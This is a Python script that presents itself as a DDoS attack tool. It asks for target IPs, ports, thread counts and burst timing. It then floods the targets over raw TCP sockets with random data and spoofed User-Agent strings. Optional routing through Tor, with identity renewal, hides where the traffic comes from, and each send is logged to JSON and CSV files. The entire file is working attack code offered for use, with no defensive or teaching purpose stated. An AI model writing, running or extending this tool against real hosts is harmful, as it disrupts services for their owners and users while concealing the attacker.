import os
import time
import socket
import threading
import logging
import subprocess
import socks  # PySocks library for SOCKS proxy
from stem import Signal
from stem.control import Controller
import random
import json
import csv

# DDOS-Attack [ASCII Art]
def display_banner():
    banner =  "███╗   ███╗██████╗ ██╗     ███████╗████████╗██╗   ██╗███╗   ███╗\n"
    banner += "████╗ ████║██╔══██╗██║     ██╔════╝╚══██╔══╝██║   ██║████╗ ████║\n"
    banner += "██╔████╔██║██████╔╝██║     █████╗     ██║   ██║   ██║██╔████╔██║\n"
    banner += "██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝     ██║   ██║   ██║██║╚██╔╝██║\n"
    banner += "██║ ╚═╝ ██║██║     ███████╗███████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║\n"
    banner += "╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝\n"
    print(banner)

mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Setup Logging
logging.basicConfig(filename='ddos_attack.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def log_to_json(entry):
    with open('ddos_attack.json', 'a') as f:
        json.dump(entry, f)
        f.write('\n')

def log_to_csv(entry):
    file_exists = os.path.isfile('ddos_attack.csv')
    with open('ddos_attack.csv', 'a', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=entry.keys())
        if not file_exists:
            writer.writeheader()
        writer.writerow(entry)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)"
]

def start_tor_service():
    try:
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Tor service started in the background.")
    except Exception as e:
        print(f"Failed to start Tor service: {e}")
        exit(1)

def renew_tor_identity():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("Tor identity renewed.")
    except Exception as e:
        print(f"Failed to renew Tor identity: {e}")

def send_packets_via_tor(ip, port, data, rate_limit):
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        while True:
            ua = random.choice(user_agents).encode()
            sock.send(data + b"\r\nUser-Agent: " + ua)
            print(f"[Tor] Sent {len(data)} bytes to {ip}:{port}")
            entry = {
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "method": "tor",
                "ip": ip,
                "port": port,
                "bytes_sent": len(data),
                "user_agent": ua.decode()
            }
            log_to_json(entry)
            log_to_csv(entry)
            time.sleep(rate_limit)
    except Exception as e:
        logging.error(f"Error sending packet to {ip}:{port} via Tor: {e}")
    finally:
        if sock:
            sock.close()

def send_packets_direct(ip, port, data, rate_limit):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        while True:
            ua = random.choice(user_agents).encode()
            sock.send(data + b"\r\nUser-Agent: " + ua)
            print(f"[Direct] Sent {len(data)} bytes to {ip}:{port}")
            entry = {
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
                "method": "direct",
                "ip": ip,
                "port": port,
                "bytes_sent": len(data),
                "user_agent": ua.decode()
            }
            log_to_json(entry)
            log_to_csv(entry)
            time.sleep(rate_limit)
    except Exception as e:
        logging.error(f"Error sending packet to {ip}:{port} directly: {e}")
    finally:
        if sock:
            sock.close()

# Main script
if __name__ == "__main__":
    ips = input("IP Targets (separated by commas): ").split(',')
    ports_input = input("Ports (separated by commas, leave blank for default): ")
    ports = list(map(int, ports_input.split(','))) if ports_input else [80, 443]

    rate_limit_input = input("Rate Limit (seconds between packets, leave blank for default): ")
    rate_limit = float(rate_limit_input) if rate_limit_input else 0.1

    data_size_input = input("Data Size (bytes, leave blank for default): ")
    data_size = int(data_size_input) if data_size_input else 600

    threads_input = input("Number of threads (leave blank for default): ")
    threads = int(threads_input) if threads_input else 20

    use_tor_input = input("Send packets via Tor? (y/n, leave blank for default 'y'): ").lower()
    use_tor = use_tor_input == 'y' if use_tor_input else True

    burst_size = int(input("Burst size (e.g. 10 threads per burst): ") or 10)
    burst_interval = float(input("Burst interval in seconds (e.g. 10): ") or 10)

    data = os.urandom(data_size)

    if use_tor:
        start_tor_service()
        time.sleep(5)

    time.sleep(3)
    for ip in ips:
        for port in ports:
            print(f"Starting the attack on {ip} at port {port}...")
            total_threads = 0
            while total_threads < threads:
                for _ in range(min(burst_size, threads - total_threads)):
                    if use_tor:
                        t = threading.Thread(target=send_packets_via_tor, args=(ip, port, data, rate_limit))
                    else:
                        t = threading.Thread(target=send_packets_direct, args=(ip, port, data, rate_limit))
                    t.start()
                    total_threads += 1
                print(f"[Burst] Sleeping for {burst_interval} seconds...\n")
                time.sleep(burst_interval)

    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    input("Press Enter to exit...")
